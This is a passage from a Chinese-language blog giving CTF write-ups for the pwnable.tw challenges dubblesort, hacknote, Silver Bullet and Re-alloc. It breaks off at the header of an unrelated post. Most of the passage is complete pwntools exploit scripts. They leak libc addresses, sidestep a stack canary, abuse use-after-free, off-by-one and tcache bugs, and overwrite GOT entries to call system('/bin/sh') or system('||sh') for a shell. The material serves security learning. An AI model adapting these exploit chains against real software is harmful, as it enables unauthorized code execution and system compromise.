<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;tw$ readelf -s libc_32.so.6 | grep system</span><br><span class="line">   245: 00110690    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0</span><br><span class="line">   627: 0003a940    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE</span><br><span class="line">  1457: 0003a940    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0</span><br></pre></td></tr></table></figure>

<p>“/bin/sh\x00”获取：使用hex软件查找字符串”/bin/sh”</p>
<p><img src="/2021/01/09/16-07-undefined/image-20210113101221317.png" alt="image-20210113101221317"></p>
<p>【直接ida搜索字符串找不到该地址，，，可能由于不再字符串段？】<a href="https://hxd.en.softonic.com/" target="_blank" rel="noopener">hex下载地址</a></p>
<h3 id="覆盖返回地址"><a href="#覆盖返回地址" class="headerlink" title="覆盖返回地址"></a>覆盖返回地址</h3><p>ida里面显示数组情况：<code>int arr_sort; // [esp+1Ch] [ebp-70h]</code>，但是由于esp计算是正确的，ebp不对。</p>
<p>根据调试得到，覆盖到canary需要0x18个字节。</p>
<p><img src="/2021/01/09/16-07-undefined/image-20210113102645806.png" alt="image-20210113102645806"></p>
<p><img src="/2021/01/09/16-07-undefined/image-20210113102755565.png" alt="image-20210113102755565"></p>
<h4 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h4><p>因为不能覆盖canary，所以要想办法不改变它的值。</p>
<p>方法是输入“+”或者“-”</p>
<p><img src="/2021/01/09/16-07-undefined/image-20210113102947391.png" alt="image-20210113102947391"></p>
<p>发现通过输入“+”、“-”并不会修改它的值。</p>
<p><img src="/2021/01/09/16-07-undefined/image-20210113103843869.png" alt="image-20210113103843869"></p>
<p>所以，接下来都填充成system函数，需要9个，接着填上“/bin/sh”的地址。</p>
<p>注意：【一般canary会小于system函数地址（0xf7开头），而libc中system又在“/bin/sh“之前，所以实现从小到大，sort后不会改变顺序，不能用“||sh”,因为大小小于system的地址。】</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding = utf - 8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">'./dubblesort'</span></span><br><span class="line">p = process(filename)</span><br><span class="line"><span class="comment">#p = remote("chall.pwnable.tw", 10101)</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"What your name :"</span>)</span><br><span class="line">p.sendline(<span class="string">"aaaa"</span>*<span class="number">6</span>)</span><br><span class="line">p.recvuntil(<span class="string">"aaaa"</span>*<span class="number">6</span>)</span><br><span class="line">leak_me = u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line">log.success(<span class="string">"leak:"</span>+hex(leak_me))</span><br><span class="line"></span><br><span class="line">libc_base = leak_me - <span class="number">0x1B000a</span></span><br><span class="line">system = libc_base + <span class="number">0x0003a940</span></span><br><span class="line">binsh = libc_base + <span class="number">0x158e8b</span></span><br><span class="line">log.success(<span class="string">"system:"</span>+hex(system))</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil("numbers do you what to sort :")</span></span><br><span class="line">p.sendline(<span class="string">"35"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_send</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	log.success(<span class="string">"idx:"</span>+str(idx))</span><br><span class="line">	p.recvuntil(str(idx)+<span class="string">" number : "</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">	print(i)</span><br><span class="line">	my_send(i,str(i))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">my_send(<span class="number">24</span>,<span class="string">"+"</span>)<span class="comment">#canary</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">	my_send(int(<span class="number">25</span>+i),str(system))</span><br><span class="line">my_send(<span class="number">34</span>,str(binsh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<p>参考：</p>
<ol>
<li><a href="https://www.freebuf.com/articles/others-articles/134271.html" target="_blank" rel="noopener">pwnable.tw刷题之dubblesort</a></li>
</ol>
<h2 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h2><blockquote>
<p>简单的堆题，uaf（类似于hitcon的uaf）</p>
<p>难点在于libc没有字符串’/bin/sh’，解决方法在于直接将字符串“||sh”作为字符串地址传入即可。</p>
</blockquote>
<p><img src="/2021/01/09/16-07-undefined/image-20210110205251966.png" alt="image-20210110205251966"></p>
<p>打印内容的语句，能否打印是判断该idx的ptr[i]是否存在</p>
<p><img src="/2021/01/09/16-07-undefined/image-20210110205533787.png" alt="image-20210110205533787"></p>
<p><img src="/2021/01/09/16-07-undefined/image-20210110205601001.png" alt="image-20210110205601001"></p>
<p>首先修改参数为got表地址，泄漏libc基址，然后修改函数地址为system，后面为“||sh”</p>
<h3 id="system-getshell参数"><a href="#system-getshell参数" class="headerlink" title="system getshell参数"></a>system getshell参数</h3><ol>
<li>‘/bin/sh’字符串地址</li>
<li>‘sh’字符串地址</li>
<li>‘||sh’字符串（感觉非常有用，，，哈哈哈）</li>
</ol>
<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">'./hacknote_4'</span></span><br><span class="line">p = process(filename)</span><br><span class="line">p=remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10102</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./hacknote_4"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Note size :"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Content :"</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	<span class="comment">#p.recvuntil("Your choice :")</span></span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#申请两个非0大小的块(而且要一样，不然不好使【不知道为什么，大佬教教我。。。】)</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'aaaa'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'bbbb'</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)<span class="comment">#0</span></span><br><span class="line">delete(<span class="number">1</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将两个块的头malloc，其中一个还是ptr[i]，另一个0x8大小的作为数据区</span></span><br><span class="line">add(<span class="number">0x8</span>,p32(<span class="number">0x0804862b</span>)+p32(elf.got[<span class="string">'atoi'</span>]))<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#因为原先两个ptr[i]都申请回来了，所以可以将上面前四个字节作为函数，后四个字节作为参数地址。</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">atoi_addr = (u32(p.recv()[:<span class="number">4</span>]))</span><br><span class="line">log.success(<span class="string">"atoi:"</span>+str(atoi_addr))</span><br><span class="line"></span><br><span class="line">libc_base = (atoi_addr) - (libc.symbols[<span class="string">'atoi'</span>])</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">"system:"</span>+hex(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#因为没有edit函数，所以先delete再add做修改。</span></span><br><span class="line">delete(<span class="number">2</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x8</span>,p32(system_addr)+<span class="string">'||sh'</span>)<span class="comment">#3</span></span><br><span class="line">show(<span class="number">0</span>)<span class="comment">#调用</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Silver-Bullet"><a href="#Silver-Bullet" class="headerlink" title="Silver Bullet"></a>Silver Bullet</h2><blockquote>
<p>off by one修改大小，造成栈溢出。</p>
<p>程序流程，分别是创建，edit修改（使用了strncat）和根据长度减去hp，可以退出循环</p>
</blockquote>
<h3 id="strncat"><a href="#strncat" class="headerlink" title="strncat"></a>strncat</h3><p><strong>原型</strong></p>
<p><code>char \* strncat(char *dest, const char *src, size_t n);</code></p>
<ul>
<li>dest指向目标字符串</li>
<li>src为指向源字符串。</li>
</ul>
<p>strncat()会将dest字符串最后的’\0’覆盖掉，字符追加完成后，再追加’\0’。</p>
<h3 id="程序流程-1"><a href="#程序流程-1" class="headerlink" title="程序流程"></a>程序流程</h3><p><img src="/2021/01/09/16-07-undefined/image-20210115105743970.png" alt="image-20210115105743970"></p>
<p>因为数据最大是0，所以<code>*((_DWORD *)s + 12) = v2;</code>刚好在数据相邻后面的位置上。</p>
<p><img src="/2021/01/09/16-07-undefined/image-20210115110048753.png" alt="image-20210115110048753"></p>
<p><img src="/2021/01/09/16-07-undefined/image-20210115110545658.png" alt="image-20210115110545658"></p>
<p><img src="/2021/01/09/16-07-undefined/image-20210115110401451.png" alt="image-20210115110401451"></p>
<p>所以，如果第一次输入40个数据，第二次输入8，那么数据长度变为8，还可以继续输入，造成栈溢出</p>
<p><img src="/2021/01/09/16-07-undefined/image-20210115111613400.png" alt="image-20210115111613400"></p>
<p>但是要程序返回的话，要需要返回，只有beat函数里面win才能return 0</p>
<p><img src="/2021/01/09/16-07-undefined/image-20210115112152972.png" alt="image-20210115112152972"></p>
<p>所以覆盖长度大于<img src="/2021/01/09/16-07-undefined/image-20210115112229004.png" alt="image-20210115112229004">，接着覆盖返回地址为输出函数，泄漏got表信息，得到基址，计算system和‘/bin/sh’地址，覆盖返回地址的返回地址为main函数，再次执行覆盖长度，填充返回地址即可得到shell。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#mobile</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">'./silver_bullet'</span></span><br><span class="line">p = process(filename)</span><br><span class="line"><span class="comment">#p = remote("chall.pwnable.tw",10103)</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./silver_bullet"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(content)</span>:</span></span><br><span class="line">	<span class="comment">#cmd(1)</span></span><br><span class="line">	p.sendline(str(<span class="number">1</span>))</span><br><span class="line">	p.recvuntil(<span class="string">"Give me your description of bullet :"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(content)</span>:</span></span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Give me your another description of bullet :"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line">add(<span class="string">"a"</span>*<span class="number">40</span>)</span><br><span class="line">edit(<span class="string">"a"</span>*<span class="number">8</span>)<span class="comment">#off by one</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">main = <span class="number">0x08048954</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\xff'</span>*<span class="number">7</span>+p32(puts_plt)+p32(main)+p32(puts_got)<span class="comment">#覆盖长度、返回地址为输出函数</span></span><br><span class="line">edit(payload)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">3</span>)<span class="comment">#win，return 0</span></span><br><span class="line">p.recvuntil(<span class="string">"Oh ! You win !!\n"</span>)</span><br><span class="line">puts_addr = u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line">log.success(<span class="string">"puts:"</span>+hex(puts_addr))<span class="comment">#得到puts的got表信息</span></span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二次main函数</span></span><br><span class="line">add(<span class="string">"a"</span>*<span class="number">40</span>)<span class="comment">#再次覆盖长度</span></span><br><span class="line">edit(<span class="string">"a"</span>*<span class="number">8</span>)</span><br><span class="line">payload = <span class="string">'\xff'</span>*<span class="number">7</span>+p32(system)+p32(main)+p32(binsh)<span class="comment">#覆盖返回地址为system</span></span><br><span class="line">edit(payload)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Re-alloc"><a href="#Re-alloc" class="headerlink" title="Re-alloc"></a>Re-alloc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">2</span> <span class="keyword">and</span> (sys.argv[<span class="number">1</span>] == <span class="string">'DEBUG'</span> <span class="keyword">or</span> sys.argv[<span class="number">1</span>] == <span class="string">'debug'</span>):</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">'./re-alloc'</span>)</span><br><span class="line">	elf = ELF(<span class="string">'./re-alloc'</span>)</span><br><span class="line">	libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="string">"10106"</span>)</span><br><span class="line">	elf = ELF(<span class="string">'./re-alloc'</span>)</span><br><span class="line">	libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr=<span class="number">0</span>,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"breakpoint_addr --&gt; "</span> + hex(text_base + <span class="number">0x202040</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr))) </span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">sda = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(name,addr)</span>:</span></span><br><span class="line">	log.info(name + <span class="string">" --&gt; %s"</span>,hex(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>	<span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">	sla(<span class="string">"choice: "</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>	<span class="title">add</span><span class="params">(idx,size,data)</span>:</span></span><br><span class="line">	choice(<span class="number">1</span>)</span><br><span class="line">	sla(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line">	sla(<span class="string">"Size:"</span>,str(size))</span><br><span class="line">	sda(<span class="string">"Data:"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>	<span class="title">realloc</span><span class="params">(idx,size,data=<span class="string">''</span>)</span>:</span></span><br><span class="line">	choice(<span class="number">2</span>)</span><br><span class="line">	sla(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line">	sla(<span class="string">"Size:"</span>,str(size))</span><br><span class="line">	<span class="keyword">if</span> size != <span class="number">0</span>:</span><br><span class="line">		sda(<span class="string">"Data:"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>	<span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">	choice(<span class="number">3</span>)</span><br><span class="line">	sla(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">8</span>,<span class="string">"hello"</span>)</span><br><span class="line">realloc(<span class="number">0</span>,<span class="number">0</span>)<span class="comment">#free了，但没有置零</span></span><br><span class="line">realloc(<span class="number">0</span>,<span class="number">8</span>,p64(elf.got[<span class="string">'atoll'</span>]))<span class="comment">#对free的块直接修改</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">8</span>,<span class="string">'n0va'</span>)<span class="comment">#将上面的块申请回来</span></span><br><span class="line">realloc(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">'aaa'</span>)<span class="comment">#修改大小为0x31</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">realloc(<span class="number">0</span>,<span class="number">0x20</span>,p64(elf.got[<span class="string">'atoll'</span>]))<span class="comment">#chunk0和chunk1内存中指向一个chunk,0的头没有置零，realloc正常。</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">'bbb'</span>)<span class="comment">#1申请回来0x31</span></span><br><span class="line">realloc(<span class="number">0</span>,<span class="number">0x30</span>,<span class="string">'bbb'</span>)<span class="comment">#realloc变0x41</span></span><br><span class="line">free(<span class="number">0</span>)<span class="comment">#0free了,头被置零了,0x41进入tcache</span></span><br><span class="line">realloc(<span class="number">1</span>,<span class="number">0x40</span>,<span class="string">'ccc'</span>)<span class="comment">#将1的大小realloc为0x51进入</span></span><br><span class="line">free(<span class="number">1</span>)<span class="comment">#1也free了，0x51进入tcache</span></span><br><span class="line"><span class="comment">#0x20 [  0]: 0x404048 (atoll@got.plt) ◂— ...</span></span><br><span class="line"><span class="comment">#0x30 [  0]: 0x404048 (atoll@got.plt) ◂— ...</span></span><br><span class="line"><span class="comment">#0x40 [  1]: 0x1db4260 ◂— 0x0</span></span><br><span class="line"><span class="comment">#0x50 [  1]: 0x1db4260 ◂— 0x0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>,p64(elf.plt[<span class="string">'printf'</span>]))<span class="comment">#修改atollgot表为printf plt</span></span><br><span class="line"><span class="comment"># leak address</span></span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,"b *0x40129D")</span></span><br><span class="line">sla(<span class="string">"Index:"</span>,<span class="string">"%3$p"</span>)<span class="comment">#泄漏信息</span></span><br><span class="line">read_chk = int(ru(<span class="string">'\n'</span>).strip(<span class="string">'\n'</span>),<span class="number">16</span>) - <span class="number">9</span></span><br><span class="line">libc_base = read_chk - libc.symbols[<span class="string">'__read_chk'</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">show(<span class="string">"libc_base: "</span>,libc_base)</span><br><span class="line">show(<span class="string">"system: "</span>,system)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># change atoll to system </span></span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line">sda(<span class="string">"Index:"</span>,<span class="string">'a'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,"b *0x40129D")</span></span><br><span class="line">sda(<span class="string">"Size:"</span>,<span class="string">'%32c'</span>)</span><br><span class="line">sda(<span class="string">"Data:"</span>,p64(system))</span><br><span class="line"></span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line">sda(<span class="string">"Index:"</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>参考：<a href="https://www.freebuf.com/news/162929.html" target="_blank" rel="noopener">Pwnable.tw刷题之Silverbullet破解过程分享</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/01/09/12-21-undefined/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/shuwen.jpg">
      <meta itemprop="name" content="Shuwen">
      <meta itemprop="description" content="做有意思的事，有意思地做事">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Shuwen's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/09/12-21-undefined/" class="post-title-link" itemprop="url">蓝桥杯入门训练</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-01-09 12:21:22" itemprop="dateCreated datePublished" datetime="2021-01-09T12:21:22+08:00">2021-01-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-08-08 00:48:35" itemprop="dateModified" datetime="2021-08-08T00:48:35+08:00">2021-08-08</time>
              </span>
